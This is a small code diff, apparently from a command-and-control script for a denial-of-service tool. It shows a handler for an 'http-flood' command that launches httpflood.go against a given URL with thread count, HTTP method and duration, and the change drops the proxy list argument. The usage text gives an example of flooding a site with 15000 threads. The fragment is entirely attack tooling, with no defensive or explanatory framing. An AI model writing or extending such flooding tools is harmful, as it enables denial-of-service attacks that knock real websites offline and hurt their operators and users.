@@ -389,7 +389,7 @@ def main():
                 thread = cnc.split()[2]
                 method = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'go run httpflood.go {url} {thread} {method} {time} proxies.txt')
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
                 print('Usage: http-flood <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: http-flood http://example.com 15000 get 60')
